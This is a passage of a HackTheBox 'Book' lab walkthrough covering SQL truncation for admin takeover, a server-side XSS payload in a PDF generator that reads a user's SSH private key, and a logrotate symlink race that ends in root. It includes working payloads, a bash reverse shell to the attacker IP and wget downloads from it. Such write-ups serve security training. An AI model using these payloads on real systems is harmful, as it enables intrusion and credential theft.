The real story lives inside the web app. By chaining a SQL truncation attack, a server-side XSS payload inside a PDF generator, and a logrotate race condition, we move from unauthenticated visitor to root on the box.</p><h2 id="machine-overview">Machine Overview</h2><p>Name: Book<br>OS: Ubuntu Linux<br>Difficulty: Medium<br>Target IP: 10.129.95.163<br>Attacker IP: 10.10.16.84</p><h2 id="attack-chain-at-a-glance">Attack Chain at a Glance:</h2><p>SQL truncation on registration → admin account takeover<br>→ server-side XSS in PDF generator → local file read of reader's SSH key<br>→ SSH as reader → user flag<br>→ logrotate symlink race condition in /home/reader/backups → root shell</p><h2 id="before-you-start">Before you start</h2><p>The attack path depends on a few concrete checks:</p><p>1. Enumerate first, exploit second. If you do not know what the app does, you will not see where it breaks.<br>2. Look for logic flaws, not just injection points. Sometimes the vulnerability is not a missing filter - it is a wrong assumption about how the database behaves.<br>3. Follow the data flow. User input does not have to reach another user to be dangerous. If the server itself processes it, the impact changes completely.<br>4. Watch privileged processes touching user-controlled paths. Anytime root reads from, writes to, or executes inside a directory you own, ask: "Can I swap this?"</p><p>With that in mind, we start where every web box starts: the network surface.</p><h2 id="phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance and Enumeration</h2><p>The first question is always the same: what can we reach?</p><p>We add the host to /etc/hosts so the application behaves exactly as it would for a legitimate user:</p><p>echo "10.129.95.163 book.htb" | sudo tee -a /etc/hosts</p><p>Then we scan the target:</p><p>nmap -sC -sV -oA book 10.129.95.163</p><p>The output is short:</p><p>PORT STATE SERVICE VERSION<br>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3<br>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</p><p>Only two ports. SSH is almost never the entry point on a web box - it is usually the escape hatch. Port 80 is where the action lives. Apache 2.4.29 on Ubuntu 18.04 is old enough to be interesting, but the real target is the custom application running on top of it.</p><p>Manual browsing reveals a login page, a registration form, and after signing up, a dashboard with books, collections, a file upload feature, a Contact Us page, and an admin panel at /admin. That gives us several angles:</p><p>- The registration form: can we create duplicate accounts or take over existing ones?<br>- The collections upload: file upload plus server-side processing is always worth a closer look.<br>- The admin panel: higher privilege, but we need credentials first.<br>- PDF generation: the server renders submitted content into PDF. If we can inject code into that pipeline, we execute code on the server itself.</p><figure><img src="/writing/media/d704ca34233600df10e8ba5d.webp" alt="HackTheBox “Book” Walkthrough, figure 2" width="1200" height="669" loading="lazy" decoding="async"></figure><h2 id="phase-2-sql-truncation-admin-takeover-without-injection">Phase 2: SQL Truncation: Admin Takeover Without Injection</h2><p>The Vulnerability</p><p>We try to register with admin@book.htb and the app responds: "User already exists." That confirms the admin account exists. Now the question is how the registration logic checks for duplicates.</p><figure><img src="/writing/media/17ba49bbe466b5d6ce7cc41e.webp" alt="HackTheBox “Book” Walkthrough, figure 3" width="1200" height="952" loading="lazy" decoding="async"></figure><p>A typical flow looks like this:</p><p>First, the app checks if the email already exists:<br>SELECT * FROM users WHERE email = 'admin@book.htb.';</p><p>If nothing comes back, it inserts the new row:<br>INSERT INTO users (email, username, password) VALUES ('admin@book.htb.', 'hacker', 'password');</p><p>Here is the catch: if the email column is defined as VARCHAR(20), the database truncates anything longer than 20 characters. And trailing spaces are stripped. So the string "admin@book.htb." is 21 characters long. The SELECT sees the full 21-character string and finds nothing. The INSERT truncates to 20 characters and strips trailing spaces, leaving exactly "admin@book.htb".</p><p>And the page source of the login page below, confirms the above:</p><figure><img src="/writing/media/f6c1af20a44684c2f86aaa52.webp" alt="HackTheBox “Book” Walkthrough, figure 4" width="1200" height="1212" loading="lazy" decoding="async"></figure><p>The database now has two rows with the same admin email: the real one, and ours with our password. When we log in, the application finds our row and gives us the admin session.</p><p>This is not SQL injection in the traditional sense. It is a logic flaw caused by assuming that "check, then insert" is atomic and safe.</p><p>Exploitation</p><p>The email field in the browser is type="email", which blocks spaces. But HTML is just a suggestion. We use curl directly:</p><p>curl -X POST <a href="http://book.htb/index.php" rel="nofollow noopener noreferrer" target="_blank">http://book.htb/index.php</a> -d 'name=pwn&amp;email=admin@book.htb%20%20%20%20%20%20.&amp;password=Hacker123!' -c cookies.txt</p><p>The email "admin@book.htb" is 14 characters. Six spaces make it 20, and the trailing dot pushes it to 21. That dot is the key: without it, the string would already be exactly 20 characters after truncation, and the insert might behave differently depending on the exact database configuration.</p><p>Then we log in immediately, because a cleanup cron removes non-default data every couple of minutes:</p><p>curl -X POST <a href="http://book.htb/admin/" rel="nofollow noopener noreferrer" target="_blank">http://book.htb/admin/</a> -d 'email=admin@book.htb&amp;password=Hacker123!' -b cookies.txt -L</p><p>We are now logged in as admin.</p><figure><img src="/writing/media/dbb6948e62791c912b56e3b6.webp" alt="HackTheBox “Book” Walkthrough, figure 5" width="1200" height="590" loading="lazy" decoding="async"></figure><h2 id="phase-3-server-side-xss-to-local-file-read">Phase 3: Server-Side XSS to Local File Read</h2><p>Understanding the PDF Generator</p><p>Inside the admin panel, the Collections tab offers a PDF export feature. The application uses a server-side HTML-to-PDF converter - html-pdf, a Node.js wrapper around a headless browser.</p><p>Normally, XSS runs in the victim's browser. Here, the victim is the PDF generator itself. When the admin clicks "Collections PDF," the server gathers all book submissions, renders them as HTML, and feeds them through the converter. If a submission contains script tags, the headless browser executes them server-side.</p><p>This is server-side XSS. Because the renderer runs on the server with filesystem access, a simple XMLHttpRequest to file:// becomes a local file read primitive.</p><p>The Payload</p><p>We need a payload that:</p><p>1. Executes in the headless browser context.<br>2. Reads a local file via file://.<br>3. Writes the file contents into the rendered document so they appear in the PDF.</p><p>The cleanest version is:</p><p>&lt;script&gt;<br>x = new XMLHttpRequest;<br>x.onload = function() {<br>&nbsp;document.write(this.responseText)<br>};<br>x.open("GET", "file:///home/reader/.ssh/id_rsa");<br>x.send();<br>&lt;/script&gt;</p><figure><img src="/writing/media/ceaf614cf370ca8fdd408f20.webp" alt="HackTheBox “Book” Walkthrough, figure 6" width="1200" height="594" loading="lazy" decoding="async"></figure><p>document.write replaces the entire HTML document with the file contents, so the PDF generator renders only the key.</p><p>Step-by-Step Exploitation</p><p>1. Register a normal user account, pwn@book.htb, and log in.<br>2. Go to Collections and submit a book:<br> - Title: the XSS payload above<br> - Author: test<br> - File: any dummy PDF<br>3. Immediately switch to the admin session and click Collections PDF.<br>4. The generated PDF contains the SSH private key for the reader user.</p><p>Timing matters. The cleanup cron removes non-default collections roughly every two minutes, so the window between submitting the book and generating the PDF is tight.</p><p>We check the collections as admin:</p><figure><img src="/writing/media/22709af48414cf10a1be1489.webp" alt="HackTheBox “Book” Walkthrough, figure 7" width="1200" height="528" loading="lazy" decoding="async"></figure><p>We click collections, and we see the key as a pdf:</p><figure><img src="/writing/media/7673de62958557fcc49037df.webp" alt="HackTheBox “Book” Walkthrough, figure 8" width="1200" height="830" loading="lazy" decoding="async"></figure><h2 id="phase-4-from-pdf-to-ssh-shell">Phase 4: From PDF to SSH Shell</h2><p>Sometimes PDF text extraction tools truncate long lines, and an SSH key with broken formatting will be rejected. If that happens, base64-encode the file inside the payload instead:</p><p>&lt;script&gt;<br>x = new XMLHttpRequest;<br>x.onload = function() {<br>&nbsp;document.write(btoa(this.responseText))<br>};<br>x.open("GET", "file:///home/reader/.ssh/id_rsa");<br>x.send();<br>&lt;/script&gt;</p><p>A base64 string wraps cleanly and can be decoded back into the original key on your attack box.</p><p>Once we have the complete key, we save it and connect:</p><pre><code data-language="text">cat &gt; id_rsa &lt;&lt; 'EOF'[Redacted: rsa private key material from the authorized lab has been removed from this published version.]EOFchmod 600 id_rsassh -i id_rsa reader@10.129.95.163</code></pre><p>We now have a stable SSH session as reader. No reverse shell, no web shell - just a clean, encrypted shell.</p><figure><img src="/writing/media/86be0afa2ced9f6cf9a1f041.webp" alt="HackTheBox “Book” Walkthrough, figure 9" width="1200" height="1401" loading="lazy" decoding="async"></figure><h2 id="phase-5-privilege-escalation-the-logrotate-race-condition">Phase 5: Privilege Escalation: The logrotate Race Condition</h2><h2 id="enumeration">Enumeration</h2><p>With a shell as reader, we start looking for the path to root:</p><p>ls -la ~<br>ls -la ~/backups<br>ps aux</p><figure><img src="/writing/media/1fd908ad910647c6342eaab5.webp" alt="HackTheBox “Book” Walkthrough, figure 10" width="1200" height="1036" loading="lazy" decoding="async"></figure><p>logrotate - version</p><figure><img src="/writing/media/a7131e39665eb7ffcfcd6f51.webp" alt="HackTheBox “Book” Walkthrough, figure 11" width="1200" height="895" loading="lazy" decoding="async"></figure><p>We find a few important things:</p><p>- A backups directory in reader's home: /home/reader/backups<br>- logrotate version 3.11.0<br>- A root-owned process running /usr/sbin/logrotate -f /root/log.cfg roughly every five seconds</p><p>logrotate 3.11.0 has a known issue, but more importantly, root is repeatedly touching files inside a directory we control. That is the classic setup for a symlink race condition.</p><p>How the Race Works</p><p>logrotate follows this basic pattern:</p><p>1. Move access.log.1 to access.log.2<br>2. Move access.log to access.log.1<br>3. Create a new empty access.log file</p><p>The new file is created with ownership based on the directory owner. Because /home/reader/backups belongs to reader, the new access.log will also belong to reader.</p><p>Between step 2 and step 3, there is a tiny window. If we can:</p><p>1. Rename /home/reader/backups to /home/reader/backups2<br>2. Create a symlink /home/reader/backups pointing to /etc/bash_completion.d</p><p>then logrotate will follow the symlink and create /etc/bash_completion.d/access.log owned by reader.</p><p>Why /etc/bash_completion.d? Because scripts in that directory are executed whenever any user starts a new bash shell. Root has a cron that spawns bash sessions, so dropping a malicious script there gives us code execution as root.</p><p>The Exploit: logrotten</p><p>We use logrotten, which watches the log file with inotify. When it detects the file being moved, it performs the rename-and-symlink swap faster than logrotate can create the new file.</p><p>On the attack box, download and serve the exploit:</p><p>wget <a href="https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c" rel="nofollow noopener noreferrer" target="_blank">https://raw.githubusercontent.com/whotwagner/logrotten/master/logrotten.c</a> \<br>&nbsp;-O ~/Downloads/logrotten.c<br>cd ~/Downloads/<br>python3 -m http.server 8000</p><figure><img src="/writing/media/2d7acc2730823d91650bcf8d.webp" alt="HackTheBox “Book” Walkthrough, figure 12" width="1200" height="436" loading="lazy" decoding="async"></figure><p>On the target, download, compile, and create the payload:</p><p>cd /dev/shm<br>wget <a href="http://10.10.16.84:8000/logrotten.c" rel="nofollow noopener noreferrer" target="_blank">http://10.10.16.84:8000/logrotten.c</a><br>gcc -o logrotten logrotten.c</p><p>cat &gt; rev.sh &lt;&lt; 'EOF'<br>#!/bin/bash<br>bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1<br>EOF</p><figure><img src="/writing/media/85527011cf19d13cacc687a0.webp" alt="HackTheBox “Book” Walkthrough, figure 13" width="1200" height="628" loading="lazy" decoding="async"></figure><p>Start a listener on the attack box:</p><p>nc -lnvp 4444</p><p>The exploit requires two SSH sessions running at the same time.</p><p>Session 1 - start the watcher:</p><p>cd /dev/shm<br>./logrotten -p./rev.sh /home/reader/backups/access.log</p><figure><img src="/writing/media/5fd046dd2aa0cf8d73e2eec9.webp" alt="HackTheBox “Book” Walkthrough, figure 14" width="1148" height="114" loading="lazy" decoding="async"></figure><p>Session 2 - trigger the rotation:</p><p>echo "trigger" &gt;&gt; /home/reader/backups/access.log</p><figure><img src="/writing/media/cd36eaa1438c57051fa524f5.webp" alt="HackTheBox “Book” Walkthrough, figure 15" width="1084" height="106" loading="lazy" decoding="async"></figure><p>Checking back ssh session 1:</p><figure><img src="/writing/media/a2b8ee21cf658f384740313d.webp" alt="HackTheBox “Book” Walkthrough, figure 16" width="1200" height="178" loading="lazy" decoding="async"></figure><p>What happens under the hood:</p><p>1. We append to access.log.<br>2. Root's cron runs logrotate -f /root/log.cfg.<br>3. logrotate moves access.log to access.log.1.<br>4. logrotten detects the move via inotify.<br>5. logrotten instantly renames backups to backups2 and creates a symlink backups → /etc/bash_completion.d.<br>6. logrotate creates backups/access.log, which actually creates /etc/bash_completion.d/access.log owned by reader.<br>7. logrotten writes our reverse shell payload into that file.<br>8. Root's cron spawns bash, executes the files in /etc/bash_completion.d, and our payload runs as root.</p><p>We are not exploiting a memory corruption bug. We are exploiting time.</p><h2 id="phase-6-root-shell-and-final-flags">Phase 6: Root Shell and Final Flags</h2><p>Back on the listener, we get the connection:</p><p>connect to [10.10.16.84] from (UNKNOWN) [10.129.95.163] 44978<br>root@book:~# id<br>uid=0(root) gid=0(root) groups=0(root)</p><p>root@book:~# cat /root/root.txt<br>Root obtained.</p><figure><img src="/writing/media/d15a2e2718bf20ec9e0c20ef.webp" alt="HackTheBox “Book” Walkthrough, figure 17" width="1044" height="428" loading="lazy" decoding="async"></figure><h2 id="lessons-learned">Lessons Learned</h2><p>1. Chain small bugs into big impact<br>No single vulnerability gave us root. We chained SQL truncation for admin access, server-side XSS for local file read, and a logrotate race condition for root. The impact comes from chaining the three flaws.</p><p>2. Never trust client-side validation<br>The email field was type="email" in the browser, which blocks spaces. We bypassed it with curl. Server-side validation is the only validation that matters.</p><p>3. Server-side XSS is powerful<br>When user input is rendered by server-side components like PDF generators, XSS stops being a browser issue and becomes code execution on the server.</p><p>4. Watch privileged processes touching user-controlled paths<br>Anytime root reads, writes, or executes inside a directory you own, ask whether you can swap it with a symlink.
